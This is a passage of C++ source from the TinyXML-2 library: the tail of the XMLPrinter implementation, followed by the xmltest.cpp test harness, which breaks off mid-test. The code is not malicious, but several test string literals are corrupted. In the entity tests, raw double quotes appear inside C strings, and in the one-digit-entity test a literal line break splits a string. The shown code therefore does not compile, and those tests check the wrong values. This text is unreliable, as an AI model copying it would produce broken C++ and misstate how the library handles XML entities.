		    len = len*2;
		    char* str = new char[len]();
			len = _vsnprintf(str, len, format, va);
			delete[] str;
		}while (len < 0);
		#else
        int len = _vscprintf( format, va );
		#endif
#else
        int len = vsnprintf( 0, 0, format, va );
#endif
        // Close out and re-start the va-args
        va_end( va );
        va_start( va, format );
        TIXMLASSERT( _buffer.Size() > 0 && _buffer[_buffer.Size() - 1] == 0 );
        char* p = _buffer.PushArr( len ) - 1;	// back up over the null terminator.
#if defined(_MSC_VER) && (_MSC_VER >= 1400 )
		#if defined(WINCE)
		_vsnprintf( p, len+1, format, va );
		#else
		vsnprintf_s( p, len+1, _TRUNCATE, format, va );
		#endif
#else
		vsnprintf( p, len+1, format, va );
#endif
    }
    va_end( va );
}


void XMLPrinter::PrintSpace( int depth )
{
    for( int i=0; i<depth; ++i ) {
        Print( "    " );
    }
}


void XMLPrinter::PrintString( const char* p, bool restricted )
{
    // Look for runs of bytes between entities to print.
    const char* q = p;

    if ( _processEntities ) {
        const bool* flag = restricted ? _restrictedEntityFlag : _entityFlag;
        while ( *q ) {
            TIXMLASSERT( p <= q );
            // Remember, char is sometimes signed. (How many times has that bitten me?)
            if ( *q > 0 && *q < ENTITY_RANGE ) {
                // Check for entities. If one is found, flush
                // the stream up until the entity, write the
                // entity, and keep looking.
                if ( flag[(unsigned char)(*q)] ) {
                    while ( p < q ) {
                        const size_t delta = q - p;
                        // %.*s accepts type int as "precision"
                        const int toPrint = ( INT_MAX < delta ) ? INT_MAX : delta;
                        Print( "%.*s", toPrint, p );
                        p += toPrint;
                    }
                    for( int i=0; i<NUM_ENTITIES; ++i ) {
                        if ( entities[i].value == *q ) {
                            Print( "&%s;", entities[i].pattern );
                            break;
                        }
                    }
                    ++p;
                }
            }
            ++q;
            TIXMLASSERT( p <= q );
        }
    }
    // Flush the remaining string. This will be the entire
    // string if an entity wasn't found.
    TIXMLASSERT( p <= q );
    if ( !_processEntities || ( p < q ) ) {
        Print( "%s", p );
    }
}


void XMLPrinter::PushHeader( bool writeBOM, bool writeDec )
{
    if ( writeBOM ) {
        static const unsigned char bom[] = { TIXML_UTF_LEAD_0, TIXML_UTF_LEAD_1, TIXML_UTF_LEAD_2, 0 };
        Print( "%s", bom );
    }
    if ( writeDec ) {
        PushDeclaration( "xml version=\"1.0\"" );
    }
}


void XMLPrinter::OpenElement( const char* name, bool compactMode )
{
    SealElementIfJustOpened();
    _stack.Push( name );

    if ( _textDepth < 0 && !_firstElement && !compactMode ) {
        Print( "\n" );
    }
    if ( !compactMode ) {
        PrintSpace( _depth );
    }

    Print( "<%s", name );
    _elementJustOpened = true;
    _firstElement = false;
    ++_depth;
}


void XMLPrinter::PushAttribute( const char* name, const char* value )
{
    TIXMLASSERT( _elementJustOpened );
    Print( " %s=\"", name );
    PrintString( value, false );
    Print( "\"" );
}


void XMLPrinter::PushAttribute( const char* name, int v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    PushAttribute( name, buf );
}


void XMLPrinter::PushAttribute( const char* name, unsigned v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    PushAttribute( name, buf );
}


void XMLPrinter::PushAttribute( const char* name, bool v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    PushAttribute( name, buf );
}


void XMLPrinter::PushAttribute( const char* name, double v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    PushAttribute( name, buf );
}


void XMLPrinter::CloseElement( bool compactMode )
{
    --_depth;
    const char* name = _stack.Pop();

    if ( _elementJustOpened ) {
        Print( "/>" );
    }
    else {
        if ( _textDepth < 0 && !compactMode) {
            Print( "\n" );
            PrintSpace( _depth );
        }
        Print( "</%s>", name );
    }

    if ( _textDepth == _depth ) {
        _textDepth = -1;
    }
    if ( _depth == 0 && !compactMode) {
        Print( "\n" );
    }
    _elementJustOpened = false;
}


void XMLPrinter::SealElementIfJustOpened()
{
    if ( !_elementJustOpened ) {
        return;
    }
    _elementJustOpened = false;
    Print( ">" );
}


void XMLPrinter::PushText( const char* text, bool cdata )
{
    _textDepth = _depth-1;

    SealElementIfJustOpened();
    if ( cdata ) {
        Print( "<![CDATA[%s]]>", text );
    }
    else {
        PrintString( text, true );
    }
}

void XMLPrinter::PushText( int value )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( value, buf, BUF_SIZE );
    PushText( buf, false );
}


void XMLPrinter::PushText( unsigned value )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( value, buf, BUF_SIZE );
    PushText( buf, false );
}


void XMLPrinter::PushText( bool value )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( value, buf, BUF_SIZE );
    PushText( buf, false );
}


void XMLPrinter::PushText( float value )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( value, buf, BUF_SIZE );
    PushText( buf, false );
}


void XMLPrinter::PushText( double value )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( value, buf, BUF_SIZE );
    PushText( buf, false );
}


void XMLPrinter::PushComment( const char* comment )
{
    SealElementIfJustOpened();
    if ( _textDepth < 0 && !_firstElement && !_compactMode) {
        Print( "\n" );
        PrintSpace( _depth );
    }
    _firstElement = false;
    Print( "<!--%s-->", comment );
}


void XMLPrinter::PushDeclaration( const char* value )
{
    SealElementIfJustOpened();
    if ( _textDepth < 0 && !_firstElement && !_compactMode) {
        Print( "\n" );
        PrintSpace( _depth );
    }
    _firstElement = false;
    Print( "<?%s?>", value );
}


void XMLPrinter::PushUnknown( const char* value )
{
    SealElementIfJustOpened();
    if ( _textDepth < 0 && !_firstElement && !_compactMode) {
        Print( "\n" );
        PrintSpace( _depth );
    }
    _firstElement = false;
    Print( "<!%s>", value );
}


bool XMLPrinter::VisitEnter( const XMLDocument& doc )
{
    _processEntities = doc.ProcessEntities();
    if ( doc.HasBOM() ) {
        PushHeader( true, false );
    }
    return true;
}


bool XMLPrinter::VisitEnter( const XMLElement& element, const XMLAttribute* attribute )
{
    const XMLElement* parentElem = 0;
    if ( element.Parent() ) {
        parentElem = element.Parent()->ToElement();
    }
    const bool compactMode = parentElem ? CompactMode( *parentElem ) : _compactMode;
    OpenElement( element.Name(), compactMode );
    while ( attribute ) {
        PushAttribute( attribute->Name(), attribute->Value() );
        attribute = attribute->Next();
    }
    return true;
}


bool XMLPrinter::VisitExit( const XMLElement& element )
{
    CloseElement( CompactMode(element) );
    return true;
}


bool XMLPrinter::Visit( const XMLText& text )
{
    PushText( text.Value(), text.CData() );
    return true;
}


bool XMLPrinter::Visit( const XMLComment& comment )
{
    PushComment( comment.Value() );
    return true;
}

bool XMLPrinter::Visit( const XMLDeclaration& declaration )
{
    PushDeclaration( declaration.Value() );
    return true;
}


bool XMLPrinter::Visit( const XMLUnknown& unknown )
{
    PushUnknown( unknown.Value() );
    return true;
}

}   // namespace tinyxml2



 
测试用例代码：
#if defined( _MSC_VER )
	#if !defined( _CRT_SECURE_NO_WARNINGS )
		#define _CRT_SECURE_NO_WARNINGS		// This test file is not intended to be secure.
	#endif
#endif

#include "tinyxml2.h"
#include <cstdlib>
#include <cstring>
#include <ctime>

#if defined( _MSC_VER )
	#include <direct.h>		// _mkdir
	#include <crtdbg.h>
	#define WIN32_LEAN_AND_MEAN
	#include <windows.h>
	_CrtMemState startMemState;
	_CrtMemState endMemState;
#elif defined(MINGW32) || defined(__MINGW32__)
    #include <io.h>  // mkdir
#else
	#include <sys/stat.h>	// mkdir
#endif

using namespace tinyxml2;
using namespace std;
int gPass = 0;
int gFail = 0;


bool XMLTest (const char* testString, const char* expected, const char* found, bool echo=true, bool extraNL=false )
{
	bool pass = !strcmp( expected, found );
	if ( pass )
		printf ("[pass]");
	else
		printf ("[fail]");

	if ( !echo ) {
		printf (" %s\n", testString);
	}
	else {
		if ( extraNL ) {
			printf( " %s\n", testString );
			printf( "%s\n", expected );
			printf( "%s\n", found );
		}
		else {
			printf (" %s [%s][%s]\n", testString, expected, found);
		}
	}

	if ( pass )
		++gPass;
	else
		++gFail;
	return pass;
}


template< class T > bool XMLTest( const char* testString, T expected, T found, bool echo=true )
{
	bool pass = ( expected == found );
	if ( pass )
		printf ("[pass]");
	else
		printf ("[fail]");

	if ( !echo )
		printf (" %s\n", testString);
	else
		printf (" %s [%d][%d]\n", testString, static_cast<int>(expected), static_cast<int>(found) );

	if ( pass )
		++gPass;
	else
		++gFail;
	return pass;
}


void NullLineEndings( char* p )
{
	while( p && *p ) {
		if ( *p == '\n' || *p == '\r' ) {
			*p = 0;
			return;
		}
		++p;
	}
}


int example_1()
{
	XMLDocument doc;
	doc.LoadFile( "resources/dream.xml" );

	return doc.ErrorID();
}
/** @page Example-1 Load an XML File
 *  @dontinclude ./xmltest.cpp
 *  Basic XML file loading.
 *  The basic syntax to load an XML file from
 *  disk and check for an error. (ErrorID()
 *  will return 0 for no error.)
 *  @skip example_1()
 *  @until }
 */
 

int example_2()
{
	static const char* xml = "<element/>";
	XMLDocument doc;
	doc.Parse( xml );

	return doc.ErrorID();
}
/** @page Example-2 Parse an XML from char buffer
 *  @dontinclude ./xmltest.cpp
 *  Basic XML string parsing.
 *  The basic syntax to parse an XML for
 *  a char* and check for an error. (ErrorID()
 *  will return 0 for no error.)
 *  @skip example_2()
 *  @until }
 */


int example_3()
{
	static const char* xml =
		"<?xml version=\"1.0\"?>"
		"<!DOCTYPE PLAY SYSTEM \"play.dtd\">"
		"<PLAY>"
		"<TITLE>A Midsummer Night's Dream</TITLE>"
		"</PLAY>";

	XMLDocument doc;
	doc.Parse( xml );

	XMLElement* titleElement = doc.FirstChildElement( "PLAY" )->FirstChildElement( "TITLE" );
	const char* title = titleElement->GetText();
	printf( "Name of play (1): %s\n", title );

	XMLText* textNode = titleElement->FirstChild()->ToText();
	title = textNode->Value();
	printf( "Name of play (2): %s\n", title );

	return doc.ErrorID();
}
/** @page Example-3 Get information out of XML
	@dontinclude ./xmltest.cpp
	In this example, we navigate a simple XML
	file, and read some interesting text. Note
	that this example doesn't use error
	checking; working code should check for null
	pointers when walking an XML tree, or use
	XMLHandle.
	
	(The XML is an excerpt from "dream.xml"). 

	@skip example_3()
	@until </PLAY>";

	The structure of the XML file is:

	<ul>
		<li>(declaration)</li>
		<li>(dtd stuff)</li>
		<li>Element "PLAY"</li>
		<ul>
			<li>Element "TITLE"</li>
			<ul>
			    <li>Text "A Midsummer Night's Dream"</li>
			</ul>
		</ul>
	</ul>

	For this example, we want to print out the 
	title of the play. The text of the title (what
	we want) is child of the "TITLE" element which
	is a child of the "PLAY" element.

	We want to skip the declaration and dtd, so the
	method FirstChildElement() is a good choice. The
	FirstChildElement() of the Document is the "PLAY"
	Element, the FirstChildElement() of the "PLAY" Element
	is the "TITLE" Element.

	@until ( "TITLE" );

	We can then use the convenience function GetText()
	to get the title of the play.

	@until title );

	Text is just another Node in the XML DOM. And in
	fact you should be a little cautious with it, as
	text nodes can contain elements. 
	
	@verbatim
	Consider: A Midsummer Night's <b>Dream</b>
	@endverbatim

	It is more correct to actually query the Text Node
	if in doubt:

	@until title );

	Noting that here we use FirstChild() since we are
	looking for XMLText, not an element, and ToText()
	is a cast from a Node to a XMLText. 
*/


bool example_4()
{
	static const char* xml =
		"<information>"
		"	<attributeApproach v='2' />"
		"	<textApproach>"
		"		<v>2</v>"
		"	</textApproach>"
		"</information>";

	XMLDocument doc;
	doc.Parse( xml );

	int v0 = 0;
	int v1 = 0;

	XMLElement* attributeApproachElement = doc.FirstChildElement()->FirstChildElement( "attributeApproach" );
	attributeApproachElement->QueryIntAttribute( "v", &v0 );

	XMLElement* textApproachElement = doc.FirstChildElement()->FirstChildElement( "textApproach" );
	textApproachElement->FirstChildElement( "v" )->QueryIntText( &v1 );

	printf( "Both values are the same: %d and %d\n", v0, v1 );

	return !doc.Error() && ( v0 == v1 );
}
/** @page Example-4 Read attributes and text information.
	@dontinclude ./xmltest.cpp

	There are fundamentally 2 ways of writing a key-value
	pair into an XML file. (Something that's always annoyed
	me about XML.) Either by using attributes, or by writing
	the key name into an element and the value into
	the text node wrapped by the element. Both approaches
	are illustrated in this example, which shows two ways
	to encode the value "2" into the key "v":

	@skip example_4()
	@until "</information>";

	TinyXML-2 has accessors for both approaches. 

	When using an attribute, you navigate to the XMLElement
	with that attribute and use the QueryIntAttribute()
	group of methods. (Also QueryFloatAttribute(), etc.)

	@skip XMLElement* attributeApproachElement
	@until &v0 );

	When using the text approach, you need to navigate
	down one more step to the XMLElement that contains
	the text. Note the extra FirstChildElement( "v" )
	in the code below. The value of the text can then
	be safely queried with the QueryIntText() group
	of methods. (Also QueryFloatText(), etc.)

	@skip XMLElement* textApproachElement
	@until &v1 );
*/


int main( int argc, const char ** argv )
{
	#if defined( _MSC_VER ) && defined( DEBUG )
		_CrtMemCheckpoint( &startMemState );
		// Enable MS Visual C++ debug heap memory leaks dump on exit
		_CrtSetDbgFlag(_CrtSetDbgFlag(_CRTDBG_REPORT_FLAG) | _CRTDBG_LEAK_CHECK_DF);
	#endif

	#if defined(_MSC_VER) || defined(MINGW32) || defined(__MINGW32__)
		#if defined __MINGW64_VERSION_MAJOR && defined __MINGW64_VERSION_MINOR
			//MINGW64: both 32 and 64-bit
			mkdir( "resources/out/" );
                #else
                	_mkdir( "resources/out/" );
                #endif
	#else
		mkdir( "resources/out/", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
	#endif

	{
		TIXMLASSERT( true );
	}

	if ( argc > 1 ) {
		XMLDocument* doc = new XMLDocument();
		clock_t startTime = clock();
		doc->LoadFile( argv[1] );
 		clock_t loadTime = clock();
		int errorID = doc->ErrorID();
		delete doc; doc = 0;
 		clock_t deleteTime = clock();

		printf( "Test file '%s' loaded. ErrorID=%d\n", argv[1], errorID );
		if ( !errorID ) {
			printf( "Load time=%u\n",   (unsigned)(loadTime - startTime) );
			printf( "Delete time=%u\n", (unsigned)(deleteTime - loadTime) );
			printf( "Total time=%u\n",  (unsigned)(deleteTime - startTime) );
		}
		exit(0);
	}

	FILE* fp = fopen( "resources/dream.xml", "r" );
	if ( !fp ) {
		printf( "Error opening test file 'dream.xml'.\n"
				"Is your working directory the same as where \n"
				"the xmltest.cpp and dream.xml file are?\n\n"
	#if defined( _MSC_VER )
				"In windows Visual Studio you may need to set\n"
				"Properties->Debugging->Working Directory to '..'\n"
	#endif
			  );
		exit( 1 );
	}
	fclose( fp );

	XMLTest( "Example-1", 0, example_1() );
	XMLTest( "Example-2", 0, example_2() );
	XMLTest( "Example-3", 0, example_3() );
	XMLTest( "Example-4", true, example_4() );

	/* ------ Example 2: Lookup information. ---- */

	{
		static const char* test[] = {	"<element />",
										"<element></element>",
										"<element><subelement/></element>",
										"<element><subelement></subelement></element>",
										"<element><subelement><subsub/></subelement></element>",
										"<!--comment beside elements--><element><subelement></subelement></element>",
										"<!--comment beside elements, this time with spaces-->  \n <element>  <subelement> \n </subelement> </element>",
										"<element attrib1='foo' attrib2=\"bar\" ></element>",
										"<element attrib1='foo' attrib2=\"bar\" ><subelement attrib3='yeehaa' /></element>",
										"<element>Text inside element.</element>",
										"<element><b></b></element>",
										"<element>Text inside and <b>bolded</b> in the element.</element>",
										"<outer><element>Text inside and <b>bolded</b> in the element.</element></outer>",
										"<element>This & That.</element>",
										"<element attrib='This<That' />",
										0
		};
		for( int i=0; test[i]; ++i ) {
			XMLDocument doc;
			doc.Parse( test[i] );
			doc.Print();
			printf( "----------------------------------------------\n" );
		}
	}
#if 1
	{
		static const char* test = "<!--hello world\n"
								  "          line 2\r"
								  "          line 3\r\n"
								  "          line 4\n\r"
								  "          line 5\r-->";

		XMLDocument doc;
		doc.Parse( test );
		doc.Print();
	}

	{
		static const char* test = "<element>Text before.</element>";
		XMLDocument doc;
		doc.Parse( test );
		XMLElement* root = doc.FirstChildElement();
		XMLElement* newElement = doc.NewElement( "Subelement" );
		root->InsertEndChild( newElement );
		doc.Print();
	}
	{
		XMLDocument* doc = new XMLDocument();
		static const char* test = "<element><sub/></element>";
		doc->Parse( test );
		delete doc;
	}
	{
		// Test: Programmatic DOM
		// Build:
		//		<element>
		//			<!--comment-->
		//			<sub attrib="1" />
		//			<sub attrib="2" />
		//			<sub attrib="3" >& Text!</sub>
		//		<element>

		XMLDocument* doc = new XMLDocument();
		XMLNode* element = doc->InsertEndChild( doc->NewElement( "element" ) );

		XMLElement* sub[3] = { doc->NewElement( "sub" ), doc->NewElement( "sub" ), doc->NewElement( "sub" ) };
		for( int i=0; i<3; ++i ) {
			sub[i]->SetAttribute( "attrib", i );
		}
		element->InsertEndChild( sub[2] );
		XMLNode* comment = element->InsertFirstChild( doc->NewComment( "comment" ) );
		element->InsertAfterChild( comment, sub[0] );
		element->InsertAfterChild( sub[0], sub[1] );
		sub[2]->InsertFirstChild( doc->NewText( "& Text!" ));
		doc->Print();
		XMLTest( "Programmatic DOM", "comment", doc->FirstChildElement( "element" )->FirstChild()->Value() );
		XMLTest( "Programmatic DOM", "0", doc->FirstChildElement( "element" )->FirstChildElement()->Attribute( "attrib" ) );
		XMLTest( "Programmatic DOM", 2, doc->FirstChildElement()->LastChildElement( "sub" )->IntAttribute( "attrib" ) );
		XMLTest( "Programmatic DOM", "& Text!",
				 doc->FirstChildElement()->LastChildElement( "sub" )->FirstChild()->ToText()->Value() );

		// And now deletion:
		element->DeleteChild( sub[2] );
		doc->DeleteNode( comment );

		element->FirstChildElement()->SetAttribute( "attrib", true );
		element->LastChildElement()->DeleteAttribute( "attrib" );

		XMLTest( "Programmatic DOM", true, doc->FirstChildElement()->FirstChildElement()->BoolAttribute( "attrib" ) );
		int value = 10;
		int result = doc->FirstChildElement()->LastChildElement()->QueryIntAttribute( "attrib", &value );
		XMLTest( "Programmatic DOM", result, (int)XML_NO_ATTRIBUTE );
		XMLTest( "Programmatic DOM", value, 10 );

		doc->Print();

		{
			XMLPrinter streamer;
			doc->Print( &streamer );
			printf( "%s", streamer.CStr() );
		}
		{
			XMLPrinter streamer( 0, true );
			doc->Print( &streamer );
			XMLTest( "Compact mode", "<element><sub attrib=\"1\"/><sub/></element>", streamer.CStr(), false );
		}
		doc->SaveFile( "./resources/out/pretty.xml" );
		doc->SaveFile( "./resources/out/compact.xml", true );
		delete doc;
	}
	{
		// Test: Dream
		// XML1 : 1,187,569 bytes	in 31,209 allocations
		// XML2 :   469,073	bytes	in    323 allocations
		//int newStart = gNew;
		XMLDocument doc;
		doc.LoadFile( "resources/dream.xml" );

		doc.SaveFile( "resources/out/dreamout.xml" );
		doc.PrintError();

		XMLTest( "Dream", "xml version=\"1.0\"",
						  doc.FirstChild()->ToDeclaration()->Value() );
		XMLTest( "Dream", true, doc.FirstChild()->NextSibling()->ToUnknown() ? true : false );
		XMLTest( "Dream", "DOCTYPE PLAY SYSTEM \"play.dtd\"",
						  doc.FirstChild()->NextSibling()->ToUnknown()->Value() );
		XMLTest( "Dream", "And Robin shall restore amends.",
						  doc.LastChild()->LastChild()->LastChild()->LastChild()->LastChildElement()->GetText() );
		XMLTest( "Dream", "And Robin shall restore amends.",
						  doc.LastChild()->LastChild()->LastChild()->LastChild()->LastChildElement()->GetText() );

		XMLDocument doc2;
		doc2.LoadFile( "resources/out/dreamout.xml" );
		XMLTest( "Dream-out", "xml version=\"1.0\"",
						  doc2.FirstChild()->ToDeclaration()->Value() );
		XMLTest( "Dream-out", true, doc2.FirstChild()->NextSibling()->ToUnknown() ? true : false );
		XMLTest( "Dream-out", "DOCTYPE PLAY SYSTEM \"play.dtd\"",
						  doc2.FirstChild()->NextSibling()->ToUnknown()->Value() );
		XMLTest( "Dream-out", "And Robin shall restore amends.",
						  doc2.LastChild()->LastChild()->LastChild()->LastChild()->LastChildElement()->GetText() );

		//gNewTotal = gNew - newStart;
	}


	{
		const char* error =	"<?xml version=\"1.0\" standalone=\"no\" ?>\n"
							"<passages count=\"006\" formatversion=\"20020620\">\n"
							"    <wrong error>\n"
							"</passages>";

		XMLDocument doc;
		doc.Parse( error );
		XMLTest( "Bad XML", doc.ErrorID(), XML_ERROR_PARSING_ATTRIBUTE );
	}

	{
		const char* str = "<doc attr0='1' attr1='2.0' attr2='foo' />";

		XMLDocument doc;
		doc.Parse( str );

		XMLElement* ele = doc.FirstChildElement();

		int iVal, result;
		double dVal;

		result = ele->QueryDoubleAttribute( "attr0", &dVal );
		XMLTest( "Query attribute: int as double", result, (int)XML_NO_ERROR );
		XMLTest( "Query attribute: int as double", (int)dVal, 1 );
		result = ele->QueryDoubleAttribute( "attr1", &dVal );
		XMLTest( "Query attribute: double as double", result, (int)XML_NO_ERROR );
		XMLTest( "Query attribute: double as double", (int)dVal, 2 );
		result = ele->QueryIntAttribute( "attr1", &iVal );
		XMLTest( "Query attribute: double as int", result, (int)XML_NO_ERROR );
		XMLTest( "Query attribute: double as int", iVal, 2 );
		result = ele->QueryIntAttribute( "attr2", &iVal );
		XMLTest( "Query attribute: not a number", result, (int)XML_WRONG_ATTRIBUTE_TYPE );
		result = ele->QueryIntAttribute( "bar", &iVal );
		XMLTest( "Query attribute: does not exist", result, (int)XML_NO_ATTRIBUTE );
	}

	{
		const char* str = "<doc/>";

		XMLDocument doc;
		doc.Parse( str );

		XMLElement* ele = doc.FirstChildElement();

		int iVal, iVal2;
		double dVal, dVal2;

		ele->SetAttribute( "str", "strValue" );
		ele->SetAttribute( "int", 1 );
		ele->SetAttribute( "double", -1.0 );

		const char* cStr = ele->Attribute( "str" );
		ele->QueryIntAttribute( "int", &iVal );
		ele->QueryDoubleAttribute( "double", &dVal );

		ele->QueryAttribute( "int", &iVal2 );
		ele->QueryAttribute( "double", &dVal2 );

		XMLTest( "Attribute match test", ele->Attribute( "str", "strValue" ), "strValue" );
		XMLTest( "Attribute round trip. c-string.", "strValue", cStr );
		XMLTest( "Attribute round trip. int.", 1, iVal );
		XMLTest( "Attribute round trip. double.", -1, (int)dVal );
		XMLTest( "Alternate query", true, iVal == iVal2 );
		XMLTest( "Alternate query", true, dVal == dVal2 );
	}

	{
		XMLDocument doc;
		doc.LoadFile( "resources/utf8test.xml" );

		// Get the attribute "value" from the "Russian" element and check it.
		XMLElement* element = doc.FirstChildElement( "document" )->FirstChildElement( "Russian" );
		const unsigned char correctValue[] = {	0xd1U, 0x86U, 0xd0U, 0xb5U, 0xd0U, 0xbdU, 0xd0U, 0xbdU,
												0xd0U, 0xbeU, 0xd1U, 0x81U, 0xd1U, 0x82U, 0xd1U, 0x8cU, 0 };

		XMLTest( "UTF-8: Russian value.", (const char*)correctValue, element->Attribute( "value" ) );

		const unsigned char russianElementName[] = {	0xd0U, 0xa0U, 0xd1U, 0x83U,
														0xd1U, 0x81U, 0xd1U, 0x81U,
														0xd0U, 0xbaU, 0xd0U, 0xb8U,
														0xd0U, 0xb9U, 0 };
		const char russianText[] = "<\xD0\xB8\xD0\xBC\xD0\xB5\xD0\xB5\xD1\x82>";

		XMLText* text = doc.FirstChildElement( "document" )->FirstChildElement( (const char*) russianElementName )->FirstChild()->ToText();
		XMLTest( "UTF-8: Browsing russian element name.",
				 russianText,
				 text->Value() );

		// Now try for a round trip.
		doc.SaveFile( "resources/out/utf8testout.xml" );

		// Check the round trip.
		int okay = 0;

		FILE* saved  = fopen( "resources/out/utf8testout.xml", "r" );
		FILE* verify = fopen( "resources/utf8testverify.xml", "r" );

		if ( saved && verify )
		{
			okay = 1;
			char verifyBuf[256];
			while ( fgets( verifyBuf, 256, verify ) )
			{
				char savedBuf[256];
				fgets( savedBuf, 256, saved );
				NullLineEndings( verifyBuf );
				NullLineEndings( savedBuf );

				if ( strcmp( verifyBuf, savedBuf ) )
				{
					printf( "verify:%s<\n", verifyBuf );
					printf( "saved :%s<\n", savedBuf );
					okay = 0;
					break;
				}
			}
		}
		if ( saved )
			fclose( saved );
		if ( verify )
			fclose( verify );
		XMLTest( "UTF-8: Verified multi-language round trip.", 1, okay );
	}

	// --------GetText()-----------
	{
		const char* str = "<foo>This is  text</foo>";
		XMLDocument doc;
		doc.Parse( str );
		const XMLElement* element = doc.RootElement();

		XMLTest( "GetText() normal use.", "This is  text", element->GetText() );

		str = "<foo><b>This is text</b></foo>";
		doc.Parse( str );
		element = doc.RootElement();

		XMLTest( "GetText() contained element.", element->GetText() == 0, true );
	}


	// --------SetText()-----------
	{
		const char* str = "<foo></foo>";
		XMLDocument doc;
		doc.Parse( str );
		XMLElement* element = doc.RootElement();

		element->SetText("darkness.");
		XMLTest( "SetText() normal use (open/close).", "darkness.", element->GetText() );

		element->SetText("blue flame.");
		XMLTest( "SetText() replace.", "blue flame.", element->GetText() );

		str = "<foo/>";
		doc.Parse( str );
		element = doc.RootElement();

		element->SetText("The driver");
		XMLTest( "SetText() normal use. (self-closing)", "The driver", element->GetText() );

		element->SetText("<b>horses</b>");
		XMLTest( "SetText() replace with tag-like text.", "<b>horses</b>", element->GetText() );
		//doc.Print();

		str = "<foo><bar>Text in nested element</bar></foo>";
		doc.Parse( str );
		element = doc.RootElement();
		
		element->SetText("wolves");
		XMLTest( "SetText() prefix to nested non-text children.", "wolves", element->GetText() );

		str = "<foo/>";
		doc.Parse( str );
		element = doc.RootElement();
		
		element->SetText( "str" );
		XMLTest( "SetText types", "str", element->GetText() );

		element->SetText( 1 );
		XMLTest( "SetText types", "1", element->GetText() );

		element->SetText( 1U );
		XMLTest( "SetText types", "1", element->GetText() );

		element->SetText( true );
		XMLTest( "SetText types", "1", element->GetText() ); // TODO: should be 'true'?

		element->SetText( 1.5f );
		XMLTest( "SetText types", "1.5", element->GetText() );

		element->SetText( 1.5 );
		XMLTest( "SetText types", "1.5", element->GetText() );
	}


	// ---------- CDATA ---------------
	{
		const char* str =	"<xmlElement>"
								"<![CDATA["
									"I am > the rules!\n"
									"...since I make symbolic puns"
								"]]>"
							"</xmlElement>";
		XMLDocument doc;
		doc.Parse( str );
		doc.Print();

		XMLTest( "CDATA parse.", doc.FirstChildElement()->FirstChild()->Value(),
								 "I am > the rules!\n...since I make symbolic puns",
								 false );
	}

	// ----------- CDATA -------------
	{
		const char* str =	"<xmlElement>"
								"<![CDATA["
									"<b>I am > the rules!</b>\n"
									"...since I make symbolic puns"
								"]]>"
							"</xmlElement>";
		XMLDocument doc;
		doc.Parse( str );
		doc.Print();

		XMLTest( "CDATA parse. [ tixml1:1480107 ]", doc.FirstChildElement()->FirstChild()->Value(),
								 "<b>I am > the rules!</b>\n...since I make symbolic puns",
								 false );
	}

	// InsertAfterChild causes crash.
	{
		// InsertBeforeChild and InsertAfterChild causes crash.
		XMLDocument doc;
		XMLElement* parent = doc.NewElement( "Parent" );
		doc.InsertFirstChild( parent );

		XMLElement* childText0 = doc.NewElement( "childText0" );
		XMLElement* childText1 = doc.NewElement( "childText1" );

		XMLNode* childNode0 = parent->InsertEndChild( childText0 );
		XMLNode* childNode1 = parent->InsertAfterChild( childNode0, childText1 );

		XMLTest( "Test InsertAfterChild on empty node. ", ( childNode1 == parent->LastChild() ), true );
	}

	{
		// Entities not being written correctly.
		// From Lynn Allen

		const char* passages =
			"<?xml version=\"1.0\" standalone=\"no\" ?>"
			"<passages count=\"006\" formatversion=\"20020620\">"
				"<psg context=\"Line 5 has "quotation marks" and 'apostrophe marks'."
				" It also has <, >, and &, as well as a fake copyright ©.\"> </psg>"
			"</passages>";

		XMLDocument doc;
		doc.Parse( passages );
		XMLElement* psg = doc.RootElement()->FirstChildElement();
		const char* context = psg->Attribute( "context" );
		const char* expected = "Line 5 has \"quotation marks\" and 'apostrophe marks'. It also has <, >, and &, as well as a fake copyright \xC2\xA9.";

		XMLTest( "Entity transformation: read. ", expected, context, true );

		FILE* textfile = fopen( "resources/out/textfile.txt", "w" );
		if ( textfile )
		{
			XMLPrinter streamer( textfile );
			psg->Accept( &streamer );
			fclose( textfile );
		}

        textfile = fopen( "resources/out/textfile.txt", "r" );
		TIXMLASSERT( textfile );
		if ( textfile )
		{
			char buf[ 1024 ];
			fgets( buf, 1024, textfile );
			XMLTest( "Entity transformation: write. ",
					 "<psg context=\"Line 5 has "quotation marks" and 'apostrophe marks'."
					 " It also has <, >, and &, as well as a fake copyright \xC2\xA9.\"/>\n",
					 buf, false );
			fclose( textfile );
		}
	}

	{
		// Suppress entities.
		const char* passages =
			"<?xml version=\"1.0\" standalone=\"no\" ?>"
			"<passages count=\"006\" formatversion=\"20020620\">"
				"<psg context=\"Line 5 has "quotation marks" and 'apostrophe marks'.\">Crazy &ttk;</psg>"
			"</passages>";

		XMLDocument doc( false );
		doc.Parse( passages );

		XMLTest( "No entity parsing.", doc.FirstChildElement()->FirstChildElement()->Attribute( "context" ),
				 "Line 5 has "quotation marks" and 'apostrophe marks'." );
		XMLTest( "No entity parsing.", doc.FirstChildElement()->FirstChildElement()->FirstChild()->Value(),
				 "Crazy &ttk;" );
		doc.Print();
	}

	{
		const char* test = "<?xml version='1.0'?><a.elem xmi.version='2.0'/>";

		XMLDocument doc;
		doc.Parse( test );
		XMLTest( "dot in names", doc.Error(), false );
		XMLTest( "dot in names", doc.FirstChildElement()->Name(), "a.elem" );
		XMLTest( "dot in names", doc.FirstChildElement()->Attribute( "xmi.version" ), "2.0" );
	}

	{
		const char* test = "<element><Name>1.1 Start easy ignore fin thickness
</Name></element>";

		XMLDocument doc;
		doc.Parse( test );

		XMLText* text = doc.FirstChildElement()->FirstChildElement()->FirstChild()->ToText();
		XMLTest( "Entity with one digit.",
				 text->Value(), "1.1 Start easy ignore fin thickness\n",
				 false );
	}

	{
		// DOCTYPE not preserved (950171)
		//
		const char* doctype =
			"<?xml version=\"1.0\" ?>"
			"<!DOCTYPE PLAY SYSTEM 'play.dtd'>"
			"<!ELEMENT title (#PCDATA)>"
			"<!ELEMENT books (title,authors)>"
